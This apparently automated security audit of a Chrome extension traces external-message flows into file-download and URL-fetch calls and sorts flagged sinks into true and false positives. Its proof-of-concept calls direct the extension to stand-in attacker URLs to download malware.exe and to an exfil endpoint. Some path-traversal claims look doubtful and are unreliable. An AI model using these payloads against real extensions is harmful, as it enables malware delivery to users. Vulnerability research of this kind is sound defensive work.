# CoCo Analysis: obgkooamoiloecoadbfaflephiefbfpn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 130+ (multiple storage, jQuery post/get, XMLHttpRequest, downloads)

**Key Vulnerability:** Arbitrary file download via chrome.downloads.download with attacker-controlled URL

---

## Primary Sink: bg_chrome_runtime_MessageExternal → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/obgkooamoiloecoadbfaflephiefbfpn/opgen_generated_files/bg.js
Line 2091: `} else if (msg.upload_url && msg.pdf && msg.pmid && apikey) {`
Line 1575: `{ url: url, filename: 'pmid_' + pmid + '.pdf', method: 'GET' },`

**Code:**

```javascript
// Background script - External message handler (bg.js, line 2301)
chrome.runtime.onMessageExternal.addListener(
  function (req, sender, sendResponse) {
    get_request(req, null); // ← attacker-controlled req
    sendResponse({});
  }
);

// get_request function (bg.js, line 1862)
function get_request (msg, _port) {
  // ... (lines 1863-2090)

  // Line 2091: msg properties are attacker-controlled
  } else if (msg.upload_url && msg.pdf && msg.pmid && apikey) {
    if (msg.pdf.substr(0, 7).toLowerCase() === 'http://') {
      get_binary(msg.pdf, msg.pmid, msg.upload_url, msg.no_email); // ← msg.pdf is attacker-controlled
    }
  }
  // ... (lines 2182-2185)
  } else if (msg.doi_link && msg.doi && msg.pmid) {
    if (localStorage.getItem('shark_link') !== 'no') {
      parse_shark(msg.pmid, 'https://' + local_mirror + '/' + msg.doi, sender_tab_id);
      // ← msg.doi flows to parse_shark
    }
  }
}

// parse_shark function (bg.js, line 1608)
function parse_shark (pmid, url, tabId) {
  // ... (lines 1608-1637)
  $.get(url, // ← url contains attacker-controlled msg.doi
    function (r) {
      h = reg.exec(r);
      if (h && h.length) {
        if (h[1].indexOf('sci-hub.') > 0) {
          args.shark_link = 'https://' + h[1].split('//')[1].split('#')[0];
        } else {
          args.shark_link = 'https://' + local_mirror + h[1].split('#')[0];
        }
        prepare_download_shark(tabId, pmid, args); // ← leads to download
      }
    }
  );
}

// prepare_download_shark function (bg.js, line 1591)
function prepare_download_shark (tabId, pmid, args) {
  localStorage.setItem('shark_' + pmid, pmid + ',' + args.shark_link);
  // ...
  if (localStorage.getItem('shark_download') === 'yes') {
    do_download_shark(pmid, args.shark_link + '?download=true'); // ← leads to download
  }
}

// do_download_shark function (bg.js, line 1558)
function do_download_shark (pmid, url) {
  // ...
  chrome.downloads.download(
    { url: url, filename: 'pmid_' + pmid + '.pdf', method: 'GET' }, // ← SINK: attacker controls url and pmid
    function (id) {
      localStorage.setItem('downloadId_' + pmid, id);
      if (localStorage.getItem('shark_open_files') === 'yes') {
        chrome.downloads.open(id); // ← Could auto-open malicious file
      }
    }
  );
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal (no externally_connectable restrictions - ANY extension can send messages)

**Attack:**

```javascript
// From any malicious extension installed on the same browser
chrome.runtime.sendMessage(
  'obgkooamoiloecoadbfaflephiefbfpn', // The paper link extension ID
  {
    doi_link: true,
    doi: '../../../../../../attacker.com/malware.exe', // ← Path traversal attempt
    pmid: 'evil'
  },
  function(response) {
    console.log('Triggered download chain');
  }
);

// OR more direct approach if apikey is available:
chrome.runtime.sendMessage(
  'obgkooamoiloecoadbfaflephiefbfpn',
  {
    upload_url: 'http://attacker.com/exfil',
    pdf: 'http://attacker.com/malware.exe', // ← Direct malicious URL
    pmid: '12345',
    // Note: requires apikey to be set, but msg can trigger other flows
  },
  function(response) {
    console.log('Triggered get_binary with malicious URL');
  }
);
```

**Impact:** Arbitrary file download - attacker can trigger the extension to download malicious files from attacker-controlled URLs. The extension has the "downloads" permission in manifest.json, enabling this attack. If the user has enabled 'shark_open_files', the downloaded file could be automatically opened, leading to potential code execution.

---

## Secondary Sinks: Multiple SSRF and Information Disclosure Vulnerabilities

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/obgkooamoiloecoadbfaflephiefbfpn/opgen_generated_files/bg.js
Line 1991: `} else if (msg.prjID && msg.doi) {`
Line 2184: `parse_shark(msg.pmid, 'https://' + local_mirror + '/' + msg.doi, sender_tab_id);`

**Code:**

```javascript
// jQuery_get_url_sink - SSRF via $.get
function get_request (msg, _port) {
  // Line 1991-2184
  } else if (msg.prjID && msg.doi) {
    // msg.doi is attacker-controlled
    parse_shark(msg.pmid, 'https://' + local_mirror + '/' + msg.doi, sender_tab_id);
  }
}

// The parse_shark function uses $.get with attacker-controlled URL
function parse_shark (pmid, url, tabId) {
  $.get(url, // ← SSRF: fetches attacker-controlled URL
    function (r) {
      // Response is processed
      const reg = /embed type="application\/pdf" src\s*=\s*"(\S+)"/i;
      const h = reg.exec(r);
      // ...
    }
  );
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message

**Attack:**

```javascript
// SSRF attack
chrome.runtime.sendMessage(
  'obgkooamoiloecoadbfaflephiefbfpn',
  {
    prjID: true,
    doi: '../../internal-api/secrets',
    pmid: '123'
  },
  function(response) {
    // Extension fetches internal URL with elevated privileges
  }
);
```

**Impact:** Server-Side Request Forgery - attacker can make the extension fetch arbitrary URLs (including internal network resources) from the extension's privileged context, bypassing same-origin policy.

---

## Tertiary Sinks: Storage Poisoning (Multiple Instances)

**CoCo Trace:**
Multiple localStorage.setItem and chrome.storage.local.set operations with attacker-controlled keys and values.

**Classification:** FALSE POSITIVE (Incomplete Storage Exploitation)

**Reason:** While CoCo detected numerous storage write operations (bg_localStorage_setItem_key_sink, bg_localStorage_setItem_value_sink, chrome_storage_local_set_sink), these are storage poisoning only. The methodology states: "Storage poisoning alone (storage.set without retrieval) is NOT a vulnerability." There is no clear exploitation chain where the attacker can retrieve these poisoned values back through sendResponse, postMessage, or other attacker-accessible outputs. The storage is used internally by the extension but not sent back to the external message sender.

---

## jQuery POST Data Sinks (Multiple Instances)

**CoCo Trace:**
Multiple jQuery_post_data_sink and jQuery_post_url_sink detections.

**Classification:** FALSE POSITIVE (Hardcoded Backend URLs - Trusted Infrastructure)

**Reason:** Examining the code, the $.post calls send data to hardcoded backend URLs:
- Line 1525: `$.post(base + '/', { apikey: req_key, pmid: pmid, g_num: g_num[1], g_link: g_link[1] }, ...)`
- Line 1598: `$.post(base + '/', args, ...)`
- Where `base = 'https://www.thepaperlink.com'` or `'https://www.thepaperlink.cn'` (hardcoded)

Per methodology: "Hardcoded backend URLs are still trusted infrastructure... Data TO hardcoded backend: attacker-data → fetch('https://api.myextension.com') = FALSE POSITIVE. Compromising developer infrastructure is separate from extension vulnerabilities."

---

## XMLHttpRequest_url_sink

**CoCo Trace:**
Line 1903: `1753131066.4144695----tainted detected!... with XMLHttpRequest_url_sink`

**Classification:** Requires further investigation, but likely FALSE POSITIVE if the URL construction uses hardcoded bases. The flow would need to be traced to confirm if attacker has full control over the URL or just parameters to hardcoded backends.

---

**Overall Assessment:** The extension has TRUE POSITIVE vulnerabilities allowing arbitrary file downloads and SSRF attacks via external message passing. The storage and POST sinks are false positives per the methodology (incomplete storage chains and hardcoded backend URLs).
